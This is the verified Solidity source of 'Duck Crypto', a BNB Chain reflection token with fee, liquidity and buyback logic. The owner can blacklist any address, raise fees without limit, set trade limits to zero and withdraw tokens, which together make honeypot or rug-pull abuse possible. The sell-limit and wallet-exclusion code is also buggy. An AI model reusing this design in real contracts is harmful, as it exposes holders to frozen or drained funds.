/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-14
*/

/**
  TG : https://t.me/duckcryptocoin
*/

// SPDX-License-Identifier: NOLICENSE
pragma solidity ^0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



library Address {
    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}




abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}


//"ETH" symb is used for better uniswap-core integration
//uniswap is use due to their better repo management

contract duckcrypto is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) private _isBot;
    

    address[] private _excluded;

    bool public tradingEnabled;
    bool public swapEnabled;
    bool public buyBackEnabled = false;
    bool private swapping;

    IRouter public router;
    address public pair;

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);

    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public maxBuyAmount = _tTotal.mul(2).div(10);
    uint256 public maxSellAmount = _tTotal.mul(1).div(10);
    uint256 public swapTokensAtAmount = 500000 * 10**_decimals;
    uint256 public _maxWalletSize = 1000000000 * 10**9; 
    uint256 public buyBackUpperLimit = 1 * 10**18;

    address public marketingAddress = 0x8216d0983Ce2543b0ac3eA70A5161AD995fc69d2;
    address public operationsAddress = 0xa76A9a59EC047a12e58342dA9153704907D5A481;
    address public constant deadAddress = 0x000000000000000000000000000000000000dEaD;

    string private constant _name = "Duck Crypto";
    string private constant _symbol = "DC";


    struct feeRatesStruct {
      uint256 rfi;
      uint256 operations;
      uint256 marketing;
      uint256 liquidity;
      uint256 buyback;
    }


    feeRatesStruct public feeRates = feeRatesStruct(
     {rfi: 4,
      operations: 0,
      marketing: 4,
      liquidity: 2,
      buyback: 0
    });

    feeRatesStruct public sellFeeRates = feeRatesStruct(
    {rfi: 4,
     operations: 0,
     marketing: 4,
     liquidity: 2,
     buyback: 0
    });

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 operations;
        uint256 marketing;
        uint256 liquidity;
        uint256 buyBack;
    }
    TotFeesPaidStruct public totFeesPaid;

    struct valuesFromGetValues{
      uint256 rAmount;
      uint256 rTransferAmount;
      uint256 rRfi;
      uint256 rOperations;
      uint256 rMarketing;
      uint256 rLiquidity;
      uint256 rBuyback;
      uint256 tTransferAmount;
      uint256 tRfi;
      uint256 tOperations;
      uint256 tMarketing;
      uint256 tLiquidity;
      uint256 tBuyback;
    }

    event FeesChanged();
    event TradingEnabled(uint256 startDate);
    event UpdatedRouter(address oldRouter, address newRouter);

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () {
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());

        router = _router;
        pair = _pair;

        _rOwned[owner()] = _rTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingAddress]=true;
        _isExcludedFromFee[operationsAddress] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    //std ERC20:
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    //override ERC20:
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        valuesFromGetValues memory s = _getValues(tAmount, true, false);
        _rOwned[sender] = _rOwned[sender].sub(s.rAmount);
        _rTotal = _rTotal.sub(s.rAmount);
        totFeesPaid.rfi += tAmount;
    }

    
    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rTransferAmount;
        }
    }

    function startTrading() external onlyOwner{
        tradingEnabled = true;
        swapEnabled = true;
        emit TradingEnabled(block.timestamp);
    }


    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    //@dev kept original RFI naming -> "reward" as in reflection
    function excludeFromReward(address account) public onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }


    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }


    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

   function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
        _maxWalletSize = _tTotal.mul(maxWallPercent).div(
            10**2
        );
   }   
   
    function setFeeRates(uint256 _rfi, uint256 _operations, uint256 _marketing, uint256 _liquidity, uint256 _buyback) external onlyOwner {
        feeRates.rfi = _rfi;
        feeRates.operations = _operations;
        feeRates.marketing = _marketing;
        feeRates.liquidity = _liquidity;
        feeRates.buyback = _buyback;
        emit FeesChanged();
    }

    function setSellFeeRates(uint256 _rfi, uint256 _operations, uint256 _marketing, uint256 _liquidity, uint256 _buyback) external onlyOwner{
        sellFeeRates.rfi = _rfi;
        sellFeeRates.operations = _operations;
        sellFeeRates.marketing = _marketing;
        sellFeeRates.liquidity = _liquidity;
        sellFeeRates.buyback = _buyback;
        emit FeesChanged();
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -=rRfi;
        totFeesPaid.rfi +=tRfi;
    }

    function _takeOperations(uint256 rOperations, uint256 tOperations) private {
        totFeesPaid.operations +=tOperations;
        if(_isExcluded[address(this)]){
             _tOwned[address(this)]+=tOperations;
        }
        _rOwned[address(this)] +=rOperations;

    }

    function _takeBuyback(uint256 rBuyback, uint256 tBuyback) private {
        totFeesPaid.buyBack +=tBuyback;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tBuyback;
        }
        _rOwned[address(this)] +=rBuyback;
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity +=tLiquidity;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tLiquidity;
        }
        _rOwned[address(this)] +=rLiquidity;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        totFeesPaid.marketing +=tMarketing;

        if(_isExcluded[marketingAddress])
        {
            _tOwned[marketingAddress]+=tMarketing;
        }
        _rOwned[marketingAddress] +=rMarketing;
    }


    function _getValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSale);
        (to_return.rAmount, to_return.rTransferAmount, to_return.rRfi,to_return.rOperations, to_return.rMarketing, to_return.rLiquidity, to_return.rBuyback) = _getRValues(to_return, tAmount, takeFee, _getRate());
        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory s) {

        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s;
        }

        if(isSale){
            s.tRfi = tAmount*sellFeeRates.rfi/100;
            s.tOperations = tAmount*sellFeeRates.operations/100;
            s.tMarketing = tAmount*sellFeeRates.marketing/100;
            s.tLiquidity = tAmount*sellFeeRates.liquidity/100;
            s.tBuyback = tAmount*sellFeeRates.buyback/100;
            s.tTransferAmount = tAmount-s.tRfi-s.tOperations-s.tMarketing-s.tLiquidity-s.tBuyback;
        }
        else{
            s.tRfi = tAmount*feeRates.rfi/100;
            s.tOperations = tAmount*feeRates.operations/100;
            s.tMarketing = tAmount*feeRates.marketing/100;
            s.tLiquidity = tAmount*feeRates.liquidity/100;
            s.tBuyback = tAmount*feeRates.buyback/100;
            s.tTransferAmount = tAmount-s.tRfi-s.tOperations-s.tMarketing-s.tLiquidity-s.tBuyback;
        }
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rOperations,uint256 rMarketing, uint256 rLiquidity, uint256 rBuyback) {
        rAmount = tAmount*currentRate;

        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0,0,0);
        }

        rRfi = s.tRfi*currentRate;
        rOperations = s.tOperations*currentRate;
        rMarketing = s.tMarketing*currentRate;
        rLiquidity = s.tLiquidity*currentRate;
        rBuyback = s.tBuyback*currentRate;
        rTransferAmount =  rAmount-rRfi-rOperations-rMarketing-rLiquidity-rBuyback;
        return (rAmount, rTransferAmount, rRfi,rOperations,rMarketing,rLiquidity, rBuyback);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
      
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
        require(!_isBot[from] && !_isBot[to], "Fuck you Bots");

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            require(tradingEnabled, "Trading is not enabled yet");
        }

        if( from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead) &&
            from == pair){
            require(amount <= maxBuyAmount, "you are exceeding maxBuyAmount");
           uint256 walletCurrentBalance = balanceOf(to);
            require(walletCurrentBalance + amount <= _maxWalletSize, "Exceeds maximum wallet token amount");
        }

        if( from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead) &&
            from == pair){
            require(amount <= maxSellAmount, "Amount is exceeding maxSellAmount");
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
        if(!swapping && swapEnabled && canSwap && from != pair){
            uint256 balance = address(this).balance;
            if (buyBackEnabled && balance > uint256(1 * 10**18) && to == pair) {
                if (balance > buyBackUpperLimit) balance = buyBackUpperLimit;
                buyBackTokens(balance.div(100));
            }

            swapAndLiquify(swapTokensAtAmount);
        }
        bool isSale;
        if(to == pair) isSale = true;

        _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]), isSale);
    }


    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {

        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSale);

        if (_isExcluded[sender] ) {  //from excluded
                _tOwned[sender] = _tOwned[sender]-tAmount;
        }
        if (_isExcluded[recipient]) { //to excluded
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        }

        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
        _reflectRfi(s.rRfi, s.tRfi);
        _takeOperations(s.rOperations,s.tOperations);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeMarketing(s.rMarketing, s.tMarketing);
        _takeBuyback(s.rBuyback, s.tBuyback);
        emit Transfer(sender, recipient, s.tTransferAmount);
        emit Transfer(sender, address(this), s.tLiquidity + s.tOperations + s.tBuyback);
        emit Transfer(sender, marketingAddress, s.tMarketing);

    }

    function buyBackTokens(uint256 amount) private lockTheSwap{
    	if (amount > 0) {
    	    swapETHForTokens(amount);
	    }
    }

    function swapETHForTokens(uint256 amount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);

      // make the swap
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, // accept any amount of Tokens
            path,
            deadAddress, // Burn address
            block.timestamp.add(300)
        );
     }

    function swapAndLiquify(uint256 tokens) private lockTheSwap{
         // Split the contract balance into halves
        uint256 denominator= (feeRates.liquidity + feeRates.buyback + feeRates.operations) * 2;
        uint256 tokensToAddLiquidityWith = tokens * feeRates.liquidity / denominator;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;

        uint256 initialBalance = address(this).balance;

        swapTokensForBNB(toSwap);

        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (denominator - feeRates.liquidity);
        uint256 bnbToAddLiquidityWith = unitBalance * feeRates.liquidity;

        if(bnbToAddLiquidityWith > 0){
            // Add liquidity to pancake
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
        }

        // Send BNB to operationsWallet
        uint256 operationsAmt = unitBalance * 2 * feeRates.operations;
        if(operationsAmt > 0){
          payable(operationsAddress).transfer(operationsAmt);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }


    function updateMarketingWallet(address newWallet) external onlyOwner{
        require(marketingAddress != newWallet ,'Wallet already set');
        marketingAddress = newWallet;
        _isExcludedFromFee[marketingAddress];
    }

    function updateOperationsWallet(address newWallet) external onlyOwner{
        require(operationsAddress != newWallet ,'Wallet already set');
        operationsAddress = newWallet;
        _isExcludedFromFee[operationsAddress];
    }

    function setMaxBuyAndSellAmount(uint256 _maxBuyamount, uint256 _maxSellAmount) external onlyOwner{
        maxBuyAmount = _maxBuyamount * 10**9;
        maxSellAmount = _maxSellAmount * 10**9;
    }

    function updateSwapTokensAtAmount(uint256 amount) external onlyOwner{
        swapTokensAtAmount = amount * 10**_decimals;
    }

    function updateSwapEnabled(bool _enabled) external onlyOwner{
        swapEnabled = _enabled;
    }

    function updateBuybackEnabled(bool _enabled) external onlyOwner{
        buyBackEnabled = _enabled;
    }

    function setAntibot(address account, bool _bot) external onlyOwner{
        require(_isBot[account] != _bot, 'Value already set');
        _isBot[account] = _bot;
    }

    function setBuybackUpperLimit(uint256 buyBackLimit) external onlyOwner() {
        buyBackUpperLimit = buyBackLimit * 10**15;
    }

    function isBot(address account) public view returns(bool){
        return _isBot[account];
    }

    //Use this in case BNB are sent to the contract by mistake
    function rescueBNB(uint256 weiAmount) external onlyOwner{
        require(address(this).balance >= weiAmount, "insufficient BNB balance");
        payable(msg.sender).transfer(weiAmount);
    }

    function rescueBEP20Tokens(address tokenAddress) external onlyOwner{
        IERC20(tokenAddress).transfer(msg.sender, IERC20(tokenAddress).balanceOf(address(this)));
    }

    /// @dev Update router address in case of pancakeswap migration
    function setRouterAddress(address newRouter) external onlyOwner {
        require(newRouter != address(router));
        IRouter _newRouter = IRouter(newRouter);
        address get_pair = IFactory(_newRouter.factory()).getPair(address(this), _newRouter.WETH());
        if (get_pair == address(0)) {
            pair = IFactory(_newRouter.factory()).createPair(address(this), _newRouter.WETH());
        }
        else {
            pair = get_pair;
        }
        router = _newRouter;
    }

    receive() external payable{
    }
}